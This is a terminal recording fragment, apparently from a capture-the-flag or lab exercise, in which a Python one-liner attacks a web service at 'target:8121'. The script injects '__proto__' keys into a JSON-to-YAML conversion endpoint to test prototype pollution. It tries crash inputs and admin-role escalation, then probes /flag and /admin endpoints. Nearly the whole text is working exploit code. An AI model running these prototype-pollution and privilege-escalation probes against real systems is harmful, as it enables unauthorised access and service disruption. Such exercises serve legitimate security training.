[2422.630159, "i", "python3 -c '\nimport urllib.request, json\nres = urllib.request.urlopen(\"http://target:8121/examples\")\norig = json.loads(res.read())[\"examples\"][0]\n\ndef test_prop(k, v):\n    payload = json.loads(json.dumps(orig))\n    payload[\"data\"][\"__proto__.\" + k] = v\n    req = urllib.request.Request(\"http://target:8121/convert-to-yaml\", method=\"POST\", data=json.dumps(payload).encode())\n    req.add_header(\"Content-Type\", \"application/json\")\n    try:\n        return json.loads(urllib.request.urlopen(req).read().decode())[\"msg\"]\n    except urllib.error.HTTPError as e:\n        return f\"ERR {e.code}\"\n    except Exception as e:\n        return str(e)\n\nprint(\"ext ->\", test_prop(\"ext\", \".txt\"))\nprint(\"extension ->\", test_prop(\"extension\", \".txt\"))\nprint(\"prefix ->\", test_prop(\"prefix\", \"hacked-\"))\nprint(\"hash ->\", test_prop(\"hash\", \"1337\"))\nprint(\"dir ->\", test_prop(\"dir\", \"/tmp\"))\nprint(\"uid (crash test) ->\", test_prop(\"uid\", \"not_a_number\"))\nprint(\"cwd (crash test) ->\", test_prop(\"cwd\", \"/invalid_dir_12345\"))\n\n# Privilege Escalation Test\ntest_prop(\"isAdmin\", True)\ntest_prop(\"admin\", True)\ntest_prop(\"is_admin\", True)\ntest_prop(\"role\", \"admin\")\n\ntry:\n    examples = json.loads(urllib.request.urlopen(\"http://target:8121/examples\").read().decode())[\"examples\"]\n    print(f\"\\n/examples size after admin pollution: {len(examples)}\")\nexcept Exception: pass\n\nfor p in [\"/flag\", \"/api/flag\", \"/admin\"]:\n    try:\n        print(f\"{p} ->\", urllib.request.urlopen(\"http://target:8121\" + p).read().decode().strip())\n    except urllib.error.HTTPError as e:\n        print(f\"{p} -> ERR\", e.code)\n'\n"]
